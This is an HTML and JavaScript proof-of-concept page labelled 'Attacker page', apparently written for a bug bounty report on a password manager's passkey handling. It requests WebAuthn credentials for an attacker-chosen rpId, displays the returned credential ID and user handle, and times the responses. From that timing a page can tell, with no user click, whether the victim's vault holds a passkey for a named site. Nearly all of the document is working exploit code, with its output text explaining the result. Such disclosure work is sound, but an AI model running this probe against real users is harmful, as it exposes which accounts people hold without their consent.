<h2>Attacker page</h2>
<p>origin: <span id="org"></span></p>

<p>
<button onclick="go('testorg-1-bugbounty.github.io','A')">Case A: rpId naming a site with no passkey</button>
<button onclick="go('evil-testorg-1-bugbounty.github.io','B')">Case B: rpId naming sites with passkeys</button>
</p>
<pre id="out"></pre>
<pre id="out_i" style="background:#eef;padding:6px"></pre>
<h3>Comparison</h3>
<pre id="cmp" style="background:#efe;padding:6px">run both cases to compare</pre>

<script>
document.getElementById('org').textContent = location.origin;
function hex(buf){return [...new Uint8Array(buf)].map(b=>b.toString(16).padStart(2,'0')).join('');}
const R = {};

async function go(rpId, tag){
  const out=document.getElementById('out'), oi=document.getElementById('out_i');
  out.textContent='requesting rpId='+rpId+' ...'; oi.textContent='';
  const t0=performance.now();
  try{
    const c=await navigator.credentials.get({publicKey:{
      challenge: crypto.getRandomValues(new Uint8Array(32)),
      rpId: rpId,
      userVerification: "discouraged"
    }});
    const dt=Math.round(performance.now()-t0);
    const uh=new TextDecoder().decode(c.response.userHandle);
    out.textContent=
      'elapsed_ms: '+dt+
      '\npage_origin: '+location.origin+
      '\nrequested_rpId: '+rpId+
      '\ncredentialId: '+c.id+
      '\nuserHandle: '+uh+
      '\nsignature_bytes: '+new Uint8Array(c.response.signature).length+
      '\nrpIdHash_hex: '+hex(c.response.authenticatorData.slice(0,32))+
      '\nclientDataJSON: '+new TextDecoder().decode(c.response.clientDataJSON);
    oi.textContent=
      'READS AS: a picker appeared and you chose a credential, so it took '+dt+'ms.\n'
      +'userHandle "'+uh+'" belongs to a site that is not '+location.hostname+'.\n'
      +'The list of sites came from a file on '+rpId+', which the attacker writes.\n'
      +'rpIdHash is SHA-256 of '+rpId+', not of the real site, so the real site rejects this signature.';
    R[tag]={ms:dt, got:true, uh:uh};
  }catch(e){
    const dt=Math.round(performance.now()-t0);
    out.textContent=
      'elapsed_ms: '+dt+
      '\npage_origin: '+location.origin+
      '\nrequested_rpId: '+rpId+
      '\nrejected_name: '+e.name+
      '\nrejected_message: '+e.message;
    oi.textContent=
      'READS AS: nothing was released, returned in '+dt+'ms with no picker.\n'
      +'The file on '+rpId+' names no site this vault holds a passkey for.\n'
      +(e.name==='SecurityError' && /registrable domain suffix/.test(e.message||'')
         ? 'The refusal came from Chrome, not LastPass: the extension declined and the call fell through to the browser.'
         : 'Refusal source unclear from the error text alone. Record it exactly.');
    R[tag]={ms:dt, got:false, uh:null};
  }
  cmp();
}

function cmp(){
  const c=document.getElementById('cmp');
  if(!R.A || !R.B){ c.textContent='ran: '+Object.keys(R).sort().join(',')+'  (run both to compare)'; return; }
  const ratio=(R.B.ms/R.A.ms).toFixed(1);
  c.textContent=
    'Case A  rpId=testorg-1-bugbounty.github.io       '+R.A.ms+'ms   credential: '+(R.A.got?'YES':'no')+'\n'+
    'Case B  rpId=evil-testorg-1-bugbounty.github.io  '+R.B.ms+'ms   credential: '+(R.B.got?'YES ('+R.B.uh+')':'no')+'\n\n'+
    'READS AS:\n'+
    (!R.A.got && R.B.got
      ? 'The two requests are identical except for which host the rpId names.\n'
       +'A returned in '+R.A.ms+'ms with nothing on screen. B took '+R.B.ms+'ms because a picker\n'
       +'appeared and waited. That is '+ratio+'x longer.\n\n'
       +'THE POINT: this page measured that difference itself, with no click in case A.\n'
       +'So an attacker can ask about a site and learn whether you hold a passkey for it\n'
       +'without you interacting at all. Getting the credential needs a click. Finding out\n'
       +'whether it exists does not.'
      : 'Both cases behaved the same way, so no timing signal here. Check that the two\n'
       +'.well-known files differ and that the vault holds a passkey for a site named in B.');
}
</script>
